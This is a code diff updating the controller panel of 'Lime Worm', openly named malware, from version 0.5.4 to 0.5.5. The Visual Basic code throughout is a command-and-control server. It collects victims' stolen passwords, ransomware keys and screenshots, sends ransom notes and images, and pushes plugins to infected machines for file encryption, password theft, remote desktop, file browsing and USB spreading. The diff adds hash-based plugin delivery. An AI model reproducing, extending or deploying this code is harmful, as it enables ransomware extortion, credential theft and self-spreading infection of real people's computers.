@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on Apr./28/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./01/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.4 ..                   ##
+'##                     .. Lime Worm v0.5.5 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -90,8 +90,6 @@ Public Class Form1
     End Sub
 
     Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Me.Load
-
-
         Control.CheckForIllegalCrossThreadCalls = False
         ContextMenuStrip1.Renderer = New MyRenderer()
         Try
@@ -105,13 +103,19 @@ Public Class Form1
             End
         End Try
 
-        Me.Text = "Lime Worm v0.5.4"
+        Me.Text = "Lime Worm v0.5.5"
 
+        If ToolStripStatusLabel2.Text.Contains("OFF") Then
+            ToolStripStatusLabel2.ForeColor = Color.Red
+        End If
 
         EXE.Enabled = False
         PATH1.Enabled = False
         DROP.Checked = False
         PATH2.Enabled = False
+
+        Dim t1 As New Threading.Thread(AddressOf Checkip)
+        t1.Start()
 
     End Sub
 #End Region
@@ -130,11 +134,11 @@ Public Class Form1
 
     Private Sub S_Connected(ByVal u As USER) Handles S.Connected
     End Sub
-
     Private Shared _Gio As New GIO(Application.StartupPath & "\GIO.dat")
     Delegate Sub _Data(ByVal u As USER, ByVal b() As Byte)
     Private Sub S_Data(ByVal u As USER, ByVal b() As Byte) Handles S.Data
         Dim A As String() = Split(BS(b), SPL)
+
         Try
             Select Case A(0)
 
@@ -147,8 +151,8 @@ Public Class Form1
                             u.L.SubItems.Add(A(i))
                         Next
 
-                        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(0).Text, Nothing) IsNot Nothing Then
-                            u.L.ForeColor = ColorTranslator.FromHtml(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(0).Text, Nothing))
+                        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(2).Text + "_" + u.L.SubItems(3).Text, Nothing) IsNot Nothing Then
+                            u.L.ForeColor = ColorTranslator.FromHtml(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(2).Text + "_" + u.L.SubItems(3).Text, Nothing))
                         End If
                         Messages("{" + u.IP.Split(":")(0) + "}", "Connected")
                         Fix()
@@ -213,7 +217,7 @@ Public Class Form1
                         If A(1).Length = 1 Then
                             Cap.Text = u.IP + " Size: " & siz(b.Length) & " ,No Changes"
                             If Cap.Button1.Text = "Stop" Then
-                                S.Send(u, "@" & SPL & Cap.C1.SelectedIndex & SPL & Cap.C2.Text & SPL & Cap.C.Value)
+                                S.Send(u, "@" & SPL & Cap.C1.SelectedIndex & SPL & Cap.C2 & SPL & Cap.C.Value)
                             End If
                             Exit Sub
                         End If
@@ -225,17 +229,13 @@ Public Class Form1
                     Messages("{" + u.IP.Split(":")(0) + "}", A(1).ToString)
 
                 Case "Key"
-
-                    If Not IO.Directory.Exists("Users" + "\" + A(1).ToString) Then
-                        IO.Directory.CreateDirectory("Users" + "\" + A(1).ToString)
-                    End If
-                    IO.File.WriteAllText("Users" + "\" + A(1).ToString + "\" + "KEY.txt", A(2))
+                    IO.File.WriteAllText(uFolder(A(1), "KEY.txt"), A(2))
 
                 Case "DEL-KEY"
-                    IO.File.Delete("Users" + "\" + A(1).ToString + "\" + "KEY.txt")
+                    IO.File.Delete(uFolder(A(1), "KEY.txt"))
 
                 Case "SC"
-                    IO.File.WriteAllBytes("Users" + "\" + A(1).ToString + "\" + "SC.jpeg", Convert.FromBase64String(A(2)))
+                    IO.File.WriteAllBytes(uFolder(A(1), "SC.jpeg"), Convert.FromBase64String(A(2)))
 
                 Case "OFM"
                     If Me.InvokeRequired Then
@@ -260,8 +260,9 @@ Public Class Form1
                     End If
 
                     Dim FM As Filemanager = My.Application.OpenForms("FM" & u.IP)
-                    If A(1) = "Error" Then
+                    If A(1) = "Error " Then
                         FM.BackToolStripMenuItem.PerformClick()
+                        FM.ToolStripStatusLabel1.Text = A(2)
                     Else
                         FM.ListView1.Items.Clear()
                         Dim allFiles As String() = Split(A(1), "|SPL_FM|")
@@ -361,11 +362,7 @@ Public Class Form1
                         i += 9
                     Next
 
-                    If Not IO.Directory.Exists("Users" + "\" + A(2).ToString) Then
-                        IO.Directory.CreateDirectory("Users" + "\" + A(2).ToString)
-                    End If
-                    IO.File.WriteAllText("Users" + "\" + A(2).ToString + "\" + "PASS.txt", A(1))
-
+                    IO.File.WriteAllText(uFolder(A(2), "PASS.txt"), A(1))
                 Case "Details"
                     If Me.InvokeRequired Then
                         Me.Invoke(New _Data(AddressOf S_Data), u, b)
@@ -388,11 +385,13 @@ Public Class Form1
                     n.ListView1.Columns.Add("")
                     n.ListView1.HeaderStyle = ColumnHeaderStyle.None
 
+
                     Dim GW As New ListViewGroup("Windows", HorizontalAlignment.Left)
                     Dim GU As New ListViewGroup("User", HorizontalAlignment.Left)
                     Dim GS As New ListViewGroup("Specifications", HorizontalAlignment.Left)
                     Dim GL As New ListViewGroup("Worm", HorizontalAlignment.Left)
                     Dim GM As New ListViewGroup("MISC", HorizontalAlignment.Left)
+
 
                     n.ListView1.Groups.Add(GU)
                     n.ListView1.Groups.Add(GW)
@@ -400,15 +399,17 @@ Public Class Form1
                     n.ListView1.Groups.Add(GL)
                     n.ListView1.Groups.Add(GM)
 
+
                     n.ListView1.Items.Add(New ListViewItem("Computer Name: ", GU)).SubItems.Add(A(1))
                     n.ListView1.Items.Add(New ListViewItem("User Name: ", GU)).SubItems.Add(A(2))
-                    n.ListView1.Items.Add(New ListViewItem("Privilege: ", GU)).SubItems.Add(A(3))
+                    n.ListView1.Items.Add(New ListViewItem("Worm ID: ", GU)).SubItems.Add(A(20))
 
 
                     n.ListView1.Items.Add(New ListViewItem("Windows Name: ", GW)).SubItems.Add(A(4))
-                    n.ListView1.Items.Add(New ListViewItem("Windows Version: ", GW)).SubItems.Add(A(6))
-                    n.ListView1.Items.Add(New ListViewItem("Windows Architecture: ", GW)).SubItems.Add(A(5))
+                    n.ListView1.Items.Add(New ListViewItem("Windows Version: ", GW)).SubItems.Add(A(5))
+                    n.ListView1.Items.Add(New ListViewItem("Windows Architecture: ", GW)).SubItems.Add(A(6))
                     n.ListView1.Items.Add(New ListViewItem("Product Key: ", GW)).SubItems.Add(A(7))
+
 
                     n.ListView1.Items.Add(New ListViewItem("Machine Type: ", GS)).SubItems.Add(A(17))
                     n.ListView1.Items.Add(New ListViewItem("DotNET Framework: ", GS)).SubItems.Add(A(18))
@@ -416,27 +417,48 @@ Public Class Form1
                     n.ListView1.Items.Add(New ListViewItem("GPU Name: ", GS)).SubItems.Add(A(9))
                     n.ListView1.Items.Add(New ListViewItem("RAM: ", GS)).SubItems.Add(A(10))
                     n.ListView1.Items.Add(New ListViewItem("Screen: ", GS)).SubItems.Add(A(11))
+                    n.ListView1.Items.Add(New ListViewItem("Fixed Drivers: ", GS)).SubItems.Add(A(19))
 
 
                     n.ListView1.Items.Add(New ListViewItem("HOST: ", GL)).SubItems.Add(A(12))
                     n.ListView1.Items.Add(New ListViewItem("PORT: ", GL)).SubItems.Add(A(13))
+                    n.ListView1.Items.Add(New ListViewItem("Privilege: ", GL)).SubItems.Add(A(3))
                     n.ListView1.Items.Add(New ListViewItem("Location: ", GL)).SubItems.Add(A(14))
+
 
                     n.ListView1.Items.Add(New ListViewItem("Last Reboot: ", GM)).SubItems.Add(A(15))
                     n.ListView1.Items.Add(New ListViewItem("Anti-Virus: ", GM)).SubItems.Add(A(16))
                     n.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
 
+
                 Case "DEC"
-                    S.Send(u, "DEC" + SPL + IO.File.ReadAllText(Application.StartupPath + "\Users" + "\" + A(1).ToString + "\" + "KEY.txt"))
+                    S.Send(u, "DEC" + SPL + IO.File.ReadAllText(uFolder(A(1), "KEY.txt")))
 
                 Case "ENC"
                     S.Send(u, "ENC" + SPL + RANS_TEXT + SPL + RANS_IMG)
+
+                Case "GPL"
+                    Dim Folderx = IO.Directory.GetFiles(Application.StartupPath & "\Plugin")
+
+                    For Each file In Folderx
+                        Dim HASH = getMD5Hash(IO.File.ReadAllBytes(file))
+
+                        If HASH = A(1) Then
+                            S.Send(u, "IPL" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(file)) + SPL + getMD5Hash(IO.File.ReadAllBytes(file)))
+                        End If
+                    Next
+
+                Case "PLUSB"
+                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\USB.dll")) + SPL + "_USB")
+
+
             End Select
         Catch ex As Exception
             MsgBox(ex.Message)
         End Try
 
     End Sub
+
 #End Region
 
 
@@ -542,6 +564,10 @@ Public Class Form1
         End Function
     End Class
 
+    Sub Checkip()
+        ToolStripStatusLabel3.Text = "LISTENING [" & GetExternalAddress() & " @ " & MYPORT & "]"
+        Exit Sub
+    End Sub
     Private Sub Fix()
         On Error Resume Next
         Me.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
@@ -555,10 +581,11 @@ Public Class Form1
 
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
         Try
-            ToolStripStatusLabel1.Text = "LISTENING PORT [" & MYPORT & "]        ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        AVAILABLE KEYS TO DECRYPT [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
+            ToolStripStatusLabel1.Text = "       ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        AVAILABLE KEYS TO DECRYPT [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
         Catch ex As Exception
         End Try
     End Sub
+
 
     Public Function KeyCount()
         Try
@@ -684,6 +711,17 @@ Public Class Form1
         End Sub
     End Class
 
+    Private Sub ToolStripStatusLabel2_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel2.Click
+        If ToolStripStatusLabel2.Text = ("       NOTIFICATION [ON]") Then
+            ToolStripStatusLabel2.Text = "       NOTIFICATION [OFF]"
+            ToolStripStatusLabel2.ForeColor = Color.Red
+        Else
+            ToolStripStatusLabel2.Text = "       NOTIFICATION [ON]"
+            ToolStripStatusLabel2.ForeColor = Color.Lime
+        End If
+        My.Settings.Noti = ToolStripStatusLabel2.Text
+        My.Settings.Save()
+    End Sub
 
 #End Region
 
@@ -742,7 +780,50 @@ Public Class Form1
 
     Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Plugin" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\RDP.dll")))
+            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\RDP.dll")))
+        Next
+    End Sub
+
+    Public Shared RANS_IMG
+    Public Shared RANS_TEXT
+    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
+        Dim R As New Ransomware
+        R.ShowDialog()
+
+        If R.OK = True Then
+            RANS_IMG = Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation))
+            RANS_TEXT = R.RichTextBox1.Text
+            For Each x As ListViewItem In L1.SelectedItems
+                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\ENC.dll")))
+            Next
+        End If
+    End Sub
+
+    Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DEC.dll")))
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message)
+        End Try
+    End Sub
+
+    Private Sub CheckFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CheckFilesToolStripMenuItem.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\FM.dll")))
+        Next
+    End Sub
+
+    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DET.dll")))
+        Next
+    End Sub
+
+    Private Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\PWD.dll")))
         Next
     End Sub
 
@@ -758,7 +839,6 @@ Public Class Form1
             Next
         End If
     End Sub
-
 
     Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
         Try
@@ -777,37 +857,6 @@ Public Class Form1
         End Try
     End Sub
 
-    Public Shared RANS_IMG
-    Public Shared RANS_TEXT
-    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
-        Dim R As New Ransomware
-        R.ShowDialog()
-
-        If R.OK = True Then
-            RANS_IMG = Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation))
-            RANS_TEXT = R.RichTextBox1.Text
-            For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "Plugin" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\ENC.dll")))
-            Next
-        End If
-    End Sub
-
-    Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
-        Try
-            For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "Plugin" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DEC.dll")))
-            Next
-        Catch ex As Exception
-            MsgBox(ex.Message)
-        End Try
-    End Sub
-
-    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Plugin" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DET.dll")))
-        Next
-    End Sub
-
     Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
         About.Show()
     End Sub
@@ -820,7 +869,7 @@ Public Class Form1
                 x.ForeColor = cDialog.Color
                 Dim CCC = ColorTranslator.ToHtml(cDialog.Color)
                 My.Computer.Registry.CurrentUser.CreateSubKey("Software\Lime")
-                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", x.SubItems(0).Text, CCC)
+                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", x.SubItems(2).Text + "_" + x.SubItems(3).Text, CCC)
             Next
         End If
     End Sub
@@ -843,18 +892,7 @@ Public Class Form1
         Next
     End Sub
 
-    Private Sub CheckFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CheckFilesToolStripMenuItem.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Plugin" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\FM.dll")))
-        Next
-    End Sub
 
-    Private Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Plugin" + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\PWD.dll")))
-        Next
-
-    End Sub
 
 
 #End Region
@@ -1004,20 +1042,7 @@ Public Class Form1
         End If
     End Sub
 
-    Private Sub ToolStripStatusLabel2_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel2.Click
-        If ToolStripStatusLabel2.Text = ("       NOTIFICATION [ON]") Then
-            ToolStripStatusLabel2.Text = "       NOTIFICATION [OFF]"
-            ToolStripStatusLabel2.ForeColor = Color.Red
-        Else
-            ToolStripStatusLabel2.Text = "       NOTIFICATION [ON]"
-            ToolStripStatusLabel2.ForeColor = Color.Lime
-        End If
-    End Sub
-
-
-
 #End Region
-
 
 
 End Class
